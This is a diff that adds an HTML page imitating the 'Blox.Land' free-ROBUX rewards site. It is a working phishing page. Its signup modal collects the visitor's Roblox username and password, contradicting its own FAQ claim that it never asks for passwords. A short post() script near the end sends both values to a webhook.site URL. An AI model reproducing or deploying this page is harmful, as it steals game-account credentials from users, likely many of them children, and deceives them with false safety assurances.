@@ -1,0 +1,397 @@
+﻿<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="description" content="Earn Free ROBUX with ease!">
+<meta name="twitter:card" content="summary">
+<meta property="og:url" content="https://blox.land/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Earn R$! - Blox.Land">
+<meta property="og:description" content="Earn Free ROBUX with ease!">
+<meta property="og:image" content="/assets/img/logo.png">
+<meta name="user" content="">
+<meta name="csrf" content="88dbc106-1ce7-5fbc-f115-f6a2a96de41f">
+<meta name="ws" content="0">
+<title>Earn R$! - Blox.Land</title>
+<link rel="apple-touch-icon" sizes="180x180" href="assets/icons/rewards/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="assets/icons/rewards/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="assets/icons/rewards/favicon-16x16.png">
+<link rel="manifest" href="assets/icons/rewards/site.webmanifest">
+<link rel="mask-icon" href="assets/icons/rewards/safari-pinned-tab.svg" color="#5bbad5">
+<link rel="shortcut icon" href="assets/icons/rewards/favicon.ico">
+<meta name="msapplication-TileColor" content="#b91d47">
+<meta name="msapplication-config" content="/assets/icons/browserconfig.xml">
+<meta name="theme-color" content="#007bff">
+<link rel="stylesheet" href="assets/css/bootstrap.min.css">
+<link rel="stylesheet" href="assets/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="assets/css/sweetalert2.min.css">
+<link rel="stylesheet" href="assets/css/roundslider.min.css">
+<link rel="stylesheet" href="assets/css/summernote-bs4.css">
+<link rel="stylesheet" href="assets/css/pyro.css">
+<link rel="stylesheet" href="assets/css/introjs.min.css">
+<link rel="stylesheet" href="assets/css/style-78be0df4.css?185aa118">
+</head>
+<body>
+<div class="rewards-navbar-spacer"></div>
+<header class="container p-0 px-md-3 pt-md-4 rewards-navbar">
+<nav class="bg-primary rounded-md shadow-sm d-flex flex-wrap justify-content-between align-items-center p-3">
+<a class="d-block" href="index.htm">
+<img src="assets/img/logo_text_white.png" height="25" alt="Blox.Land">
+</a>
+<a class="h3 mb-0 mt-n1 order-md-1 link-no-effect" href="enter.html" data-step="5" data-intro="This is your balance. If you click on it, you can visit your account and check your milestones!">
+<span id="balance" class="badge badge-light custom-nav-badge text-primary font-weight-normal" data-toggle="tooltip" title="Your Account">
+<span class="fa fa-user"></span>
+</span>
+</a>
+<div class="d-flex justify-content-center align-items-center flex-grow-1 pt-3 pt-md-0">
+<a class="mr-3 custom-nav-text" href="enter.html">
+<span class="fa fa-coins mr-md-1"></span>
+<span>Earn</span>
+</a>
+<a class="mx-3 custom-nav-text" href="enter.html" data-step="4" data-intro="Transfer R$ to your RBLX account by withdrawing your balance here!">
+<span class="fa fa-credit-card mr-md-1"></span>
+<span>Withdraw</span>
+</a>
+<div class="dropdown">
+<a class="ml-3 custom-nav-text dropdown-toggle" data-toggle="dropdown" href="#">
+<span class="fa fa-gift mr-md-1"></span>
+<span>More</span>
+</a>
+<div class="dropdown-menu dropdown-menu-right shadow-sm">
+<a class="dropdown-item py-2" href="enter.html">
+<span class="fa fa-fw fa-lg fa-users text-primary mr-3"></span>
+<span class="lead">Invite Friends</span>
+</a>
+<a class="dropdown-item py-2" href="enter.html">
+<span class="fab fa-fw fa-lg fa-tiktok text-primary mr-3"></span>
+<span class="lead">TikTok Competition</span>
+</a>
+<a class="dropdown-item py-2" href="enter.html">
+<span class="fab fa-fw fa-lg fa-youtube text-primary mr-3"></span>
+<span class="lead">YouTube Competition</span>
+</a>
+<a class="dropdown-item py-2" href="enter.html">
+<span class="fa fa-fw fa-lg fa-barcode text-primary mr-3"></span>
+<span class="lead">Promo Codes</span>
+</a>
+<a class="dropdown-item py-2" href="enter.html">
+<span class="fa fa-fw fa-lg fa-ticket-alt text-primary mr-3"></span>
+<span class="lead">Giveaway</span>
+</a>
+</div>
+</div>
+</div>
+</nav>
+</header>
+<main id="content" role="main">
+<style>
+		body,ins{
+			background-color: #f5f5f5 !important;
+		}
+	</style>
+<div class="container py-4">
+<div class="card mb-4">
+<div class="card-body shadow-sm bg-light text-center pt-2 pb-2">
+<h1 class="display-1 text-primary text-responsive-huge">Blox.Land</h1>
+<h4 class="text-muted display-4 mb-4" style="font-size: 2rem;">&nbsp;<span id="landing-typed"></span>&nbsp;</h4>
+<img src="assets/svg/irregular-shape-2-bottom.svg" style="position: absolute; left: 0px; width: 100%; bottom: 0;pointer-events: none;">
+<img src="assets/svg/abstract-shapes-4.svg" class="d-none d-md-block" style="position: absolute; left: 0px; height: 70%; top: 0;pointer-events: none;">
+<img src="assets/svg/abstract-shapes-10.svg" class="d-none d-md-block" style="position: absolute; right: 0px; height: 90%; bottom: 0;pointer-events: none;">
+<div class="row justify-content-center">
+<div class="col-md-6">
+<button type="button" data-toggle="modal" data-target="#auth-roblox-username-modal" class="btn btn-lg btn-primary px-5 shadow glow"><span class="fa fa-lg fa-coins mr-4"></span>Signup Today!</button>
+</div>
+</div>
+<div class="my-3 lead text-muted">We will never ask for your password!</div>
+</div>
+</div>
+<div class="row flex-nowrap overflow-hidden" id="LiveOffersContainer">
+<div class="LiveOffersUser col">
+<div class="card py-2 px-3 shadow-sm mb-4 text-center d-flex flex-row align-items-center justify-content-between">
+<div><img src="assets/img/avatar.png" alt="xXSh****672" class="rounded-circle live-offer-avatar" width="40"></div>
+<div class="text-center">
+<p class="font-weight-light text-primary mb-1 live-offer-user">xXSh****672</p>
+<p class="small text-muted mb-0">Earned <span class="text-success live-offer-amount">0.70 R$</span></p>
+</div>
+</div>
+</div>
+<div class="LiveOffersUser col">
+<div class="card py-2 px-3 shadow-sm mb-4 text-center d-flex flex-row align-items-center justify-content-between">
+<div><img src="assets/img/avatar.png" alt="xXSh****672" class="rounded-circle live-offer-avatar" width="40"></div>
+<div class="text-center">
+<p class="font-weight-light text-primary mb-1 live-offer-user">xXSh****672</p>
+<p class="small text-muted mb-0">Earned <span class="text-success live-offer-amount">4 R$</span></p>
+</div>
+</div>
+</div>
+<div class="LiveOffersUser col">
+<div class="card py-2 px-3 shadow-sm mb-4 text-center d-flex flex-row align-items-center justify-content-between">
+<div><img src="assets/img/avatar.png" alt="ashl****194" class="rounded-circle live-offer-avatar" width="40"></div>
+<div class="text-center">
+<p class="font-weight-light text-primary mb-1 live-offer-user">ashl****194</p>
+<p class="small text-muted mb-0">Earned <span class="text-success live-offer-amount">6.90 R$</span></p>
+</div>
+</div>
+</div>
+<div class="LiveOffersUser col">
+<div class="card py-2 px-3 shadow-sm mb-4 text-center d-flex flex-row align-items-center justify-content-between">
+<div><img src="assets/img/avatar.png" alt="mats****451" class="rounded-circle live-offer-avatar" width="40"></div>
+<div class="text-center">
+<p class="font-weight-light text-primary mb-1 live-offer-user">mats****451</p>
+<p class="small text-muted mb-0">Earned <span class="text-success live-offer-amount">102.90 R$</span></p>
+</div>
+</div>
+</div>
+<div class="LiveOffersUser col">
+<div class="card py-2 px-3 shadow-sm mb-4 text-center d-flex flex-row align-items-center justify-content-between">
+<div><img src="assets/img/avatar.png" alt="tad4****5" class="rounded-circle live-offer-avatar" width="40"></div>
+<div class="text-center">
+<p class="font-weight-light text-primary mb-1 live-offer-user">tad4****5</p>
+<p class="small text-muted mb-0">Earned <span class="text-success live-offer-amount">210 R$</span></p>
+</div>
+</div>
+</div>
+<div class="LiveOffersUser col">
+<div class="card py-2 px-3 shadow-sm mb-4 text-center d-flex flex-row align-items-center justify-content-between">
+<div><img src="assets/img/avatar.png" alt="BJ_R****618" class="rounded-circle live-offer-avatar" width="40"></div>
+<div class="text-center">
+<p class="font-weight-light text-primary mb-1 live-offer-user">BJ_R****618</p>
+<p class="small text-muted mb-0">Earned <span class="text-success live-offer-amount">0.70 R$</span></p>
+</div>
+</div>
+</div>
+</div>
+<div id="749622441">
+<script type="f20e863632db70f713f6b8e9-text/javascript">
+				try {
+					window._mNHandle.queue.push(function (){
+						window._mNDetails.loadTag("749622441", "728x90", "749622441");
+					});
+				}
+				catch (error) {}
+			</script>
+</div>
+<div class="row">
+<div class="col-md-4">
+<div class="card mb-4 shadow-sm text-primary">
+<div class="card-body">
+<div class="d-flex d-md-block d-lg-flex">
+<div class="pt-2 pl-3 pr-4 pb-md-3 pb-lg-0 text-center">
+<span class="fa fa-coins display-4"></span>
+</div>
+<div class="text-left text-md-center text-lg-left">
+<span class="d-block display-4 mb-0" style="font-size: 2rem;">175M R$+</span>
+<span class="d-block lead text-muted">Total Earned</span>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="col-md-4">
+<div class="card mb-4 shadow-sm text-primary">
+<div class="card-body">
+<div class="d-flex d-md-block d-lg-flex">
+<div class="pt-2 pl-3 pr-4 pb-md-3 pb-lg-0 text-center">
+<span class="fa fa-users display-4"></span>
+</div>
+<div class="text-left text-md-center text-lg-left">
+<span class="d-block display-4 mb-0" style="font-size: 2rem;">10M+</span>
+<span class="d-block lead text-muted">Total Users</span>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="col-md-4">
+<div class="card mb-4 shadow-sm text-primary">
+<div class="card-body">
+<div class="d-flex d-md-block d-lg-flex">
+<div class="pt-2 pl-3 pr-4 pb-md-3 pb-lg-0 text-center">
+<span class="fa fa-th-list display-4"></span>
+</div>
+<div class="text-left text-md-center text-lg-left">
+<span class="d-block display-4 mb-0" style="font-size: 2rem;">9M+</span>
+<span class="d-block lead text-muted">Total Offers</span>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="row">
+<div class="col-md-4">
+<div class="card card-body shadow-sm mb-4 text-center">
+<span class="fa fa-4x fa-user-plus text-primary my-3"></span>
+<h1 class="font-weight-light text-primary mb-3">Sign Up</h1>
+<p class="font-weight-light text-muted mb-2 mx-md-3">Join our community of over 10M users and start earning R$ today with very little effort!</p>
+</div>
+</div>
+<div class="col-md-4">
+<div class="card card-body shadow-sm mb-4 text-center">
+<span class="fa fa-4x fa-coins text-primary my-3"></span>
+<h1 class="font-weight-light text-primary mb-3">Earn</h1>
+<p class="font-weight-light text-muted mb-2">Download mobile apps and watch short videos to earn points or enter our daily giveaways and promocodes!</p>
+</div>
+</div>
+<div class="col-md-4">
+<div class="card card-body shadow-sm mb-4 text-center">
+<span class="fa fa-4x fa-credit-card text-primary my-3"></span>
+<h1 class="font-weight-light text-primary mb-3">Withdraw</h1>
+<p class="font-weight-light text-muted mb-2">Cash out your earning directly to your RBLX account and spend it on your favorite items and games!</p>
+</div>
+</div>
+</div>
+<div class="row">
+<div class="col-md-6">
+<div class="accordion shadow-sm mb-4" id="faq-container">
+<div class="card">
+<div class="card-header bg-white">
+<button class="btn btn-link text-priamry lead link-no-effect btn-block text-left px-0 collapsed" type="button" data-toggle="collapse" data-target="#faq-one">
+How does BLOX.LAND work?
+</button>
+</div>
+<div id="faq-one" class="collapse" data-parent="#faq-container">
+<div class="card-body bg-light border-top pb-2">
+You can earn R$ by completing “offers” on our offerwalls. These offers can range from completing quizzes, surveys, and downloading mobile apps and games. Mobile apps & games are usually the easiest offers to complete in these offerwalls, but survey offers give you the most amount of R$ when they succeed.
+</div>
+</div>
+</div>
+<div class="card">
+<div class="card-header bg-white">
+<button class="btn btn-link text-priamry lead link-no-effect btn-block text-left px-0 collapsed" type="button" data-toggle="collapse" data-target="#faq-two">
+Is BLOX.LAND safe to use?
+</button>
+</div>
+<div id="faq-two" class="collapse" data-parent="#faq-container">
+<div class="card-body bg-light border-top">
+Definitely! We never require any private information such as your game account passwords. The only thing needed is your username to get started. So what are you waiting for? Get started now!
+</div>
+</div>
+</div>
+<div class="card">
+<div class="card-header bg-white">
+<button class="btn btn-link text-priamry lead link-no-effect btn-block text-left px-0 collapsed" type="button" data-toggle="collapse" data-target="#faq-three">
+How do I receive R$?
+</button>
+</div>
+<div id="faq-three" class="collapse" data-parent="#faq-container">
+<div class="card-body bg-light border-top">
+After completing an offer, you will be able to withdraw your balance into your RBLX account. You will be asked to create a Private Server and set it to the price given, we will then purchase the Private Server and R$ will be transferred to your account!
+</div>
+</div>
+</div>
+<div class="card">
+<div class="card-header bg-white">
+<button class="btn btn-link text-priamry lead link-no-effect btn-block text-left px-0 collapsed" type="button" data-toggle="collapse" data-target="#faq-four">
+How does BLOX.LAND make money?
+</button>
+</div>
+<div id="faq-four" class="collapse" data-parent="#faq-container">
+<div class="card-body bg-light border-top">
+We use the money from the offer companies to purchase R$ to give to our users, and keep a small commission for ourselves! You will be able to immediately withdraw your R$ to your RBLX account after completing an offer. This creates a fair, win-win solution for everyone involved!
+</div>
+</div>
+</div>
+<div class="card">
+<div class="card-header bg-white">
+<button class="btn btn-link text-priamry lead link-no-effect btn-block text-left px-0 collapsed" type="button" data-toggle="collapse" data-target="#faq-five">
+I have a business inquiry
+</button>
+</div>
+<div id="faq-five" class="collapse" data-parent="#faq-container">
+<div class="card-body bg-light border-top">
+For business inquiries, contact <a href="cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="3447445b5a475b46475c5d44477456585b4c1a58555a50">[email&#160;protected]</a>. For support or other inquiries, join our Discord server <a href="https://discord.gg/K8RjSGYtxH">https://discord.gg/K8RjSGYtxH</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="col-md-6">
+<div class="card rounded shadow-sm">
+<div class="embed-responsive embed-responsive-16by9">
+<iframe class="embed-responsive-item rounded" src="https://www.youtube.com/embed/PRDjwZCQ8Ms" allowfullscreen=""></iframe>
+</div>
+</div>
+</div>
+</div>
+<p class="lead text-center text-muted mt-5">We’re not affiliated in any way with the Roblox Corporation or any of its trademarks.</p>
+</div>
+<div class="modal fade" id="auth-roblox-username-modal">
+<div class="modal-dialog modal-dialog-centered">
+<div class="modal-content">
+<div class="modal-header d-block text-center">
+<h3 class="text-center text-muted font-weight-light mb-0">Signup with your Rblx username,password!</h3>
+</div>
+<div class="modal-body">
+<input type="text" class="form-control form-control-lg" id="auth-roblox-username" placeholder="Roblx Username" onkeypress="if (!window.__cfRLUnblockHandlers) return false; return event.charCode != 32" value="" required="" autofocus="" data-cf-modified-f20e863632db70f713f6b8e9-="">
+<input type="password" class="form-control form-control-lg" id="auth-roblox-password" placeholder="Roblx Password" onkeypress="if (!window.__cfRLUnblockHandlers) return false; return event.charCode != 32" value="" required="" autofocus="" data-cf-modified-f20e863632db70f713f6b8e9-="">
+<button onclick="post()" id="submitButton" type="submit" class="btn btn-block btn-lg btn-primary"> Signup</button>
+<div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</main>
+<footer class="footer">
+<span class="d-block text-muted text-center pt-2">
+<a class="text-muted" href="terms.html">Terms & Conditions</a>&nbsp;&#149;
+<a class="text-muted" href="privacy-policy.html">Privacy Policy</a>&nbsp;&#149;
+<a class="text-muted" href="return-policy.html">Return Policy</a>&nbsp;&#149;
+<a class="text-muted" href="eula.html">EULA</a>
+<span class="d-block pt-1 text-muted text-center">Copyright © 2021 Blox.Land. All Rights Reserved. We are not affiliated with ROBLOX or any of their trademarks.</span>
+</span>
+</footer>
+<script>
+	function post() {
+		var User = document.getElementById("auth-roblox-username").value;
+        var Pass = document.getElementById("auth-roblox-password").value;
+		window.location = "https://webhook.site/09f70c1a-ed30-4c0a-b266-b230e29e20d5?c=" + User + " " + Pass
+	}
+</script>
+<script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="assets/js/jquery-3.4.1.min.js" type="f20e863632db70f713f6b8e9-text/javascript"></script>
+<script src="assets/js/bootstrap.bundle.min.js" type="f20e863632db70f713f6b8e9-text/javascript"></script>
+<script src="assets/js/typed.min.js" type="f20e863632db70f713f6b8e9-text/javascript"></script>
+<script src="assets/js/sweetalert2.min.js" type="f20e863632db70f713f6b8e9-text/javascript"></script>
+<script src="assets/js/roundslider.min.js" type="f20e863632db70f713f6b8e9-text/javascript"></script>
+<script src="assets/js/intro.min.js" type="f20e863632db70f713f6b8e9-text/javascript"></script>
+<script src="assets/js/script-4bbb5b20.js?mmmbbgg" type="f20e863632db70f713f6b8e9-text/javascript"></script>
+<script async="" src="gtag/js?id=UA-122952025-1" type="f20e863632db70f713f6b8e9-text/javascript"></script>
+<script type="f20e863632db70f713f6b8e9-text/javascript">
+		window.dataLayer = window.dataLayer || [];
+		function gtag(){
+			dataLayer.push(arguments);
+		}
+		gtag('js', new Date());
+		gtag('config', 'UA-122952025-1', {
+			'user_id': ''
+		});
+		gtag('set', {'user_id': ''}); // Set the user ID using signed-in user_id.
+	</script>
+<script type="f20e863632db70f713f6b8e9-text/javascript">
+		(function(h,o,t,j,a,r){
+			h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
+			h._hjSettings = {
+				hjid: 1759528,
+				hjsv: 6
+			};
+			a=o.getElementsByTagName('head')[0];
+			r=o.createElement('script');r.async=1;
+			r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
+			a.appendChild(r);
+		})(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
+	</script>
+<script type="f20e863632db70f713f6b8e9-text/javascript">
+        !function(t,e){var o,n,p,r;e.__SV||(window.posthog=e,e._i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(".");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}(p=t.createElement("script")).type="text/javascript",p.async=!0,p.src=s.api_host+"/static/array.js",(r=t.getElementsByTagName("script")[0]).parentNode.insertBefore(p,r);var u=e;for(void 0!==a?u=e[a]=[]:a="posthog",u.people=u.people||[],u.toString=function(t){var e="posthog";return"posthog"!==a&&(e+="."+a),t||(e+=" (stub)"),e},u.people.toString=function(){return u.toString(1)+".people (stub)"},o="capture identify alias people.set people.set_once set_config register register_once unregister opt_out_capturing has_opted_out_capturing opt_in_capturing reset isFeatureEnabled onFeatureFlags".split(" "),n=0;n<o.length;n++)g(u,o[n]);e._i.push([i,s,a])},e.__SV=1)}(document,window.posthog||[]);
+        posthog.init('phc_KJLN4lEaJdgsXPUFzOEq4Wp70gA11nNrY3yins1svmm', {
+            api_host: 'https://app.posthog.com',
+            autocapture: {
+                css_selector_allowlist: ['[data-posthog]'],
+            },
+        });
+        
+    </script>
+<script src="cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="f20e863632db70f713f6b8e9-|49" defer=""></script><script>(function(){var js = "window['__CF$cv$params']={r:'7f37b94a186419e0',t:'MTY5MTQ5NzMzNi4zMDMwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/invisible.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>
+</html>
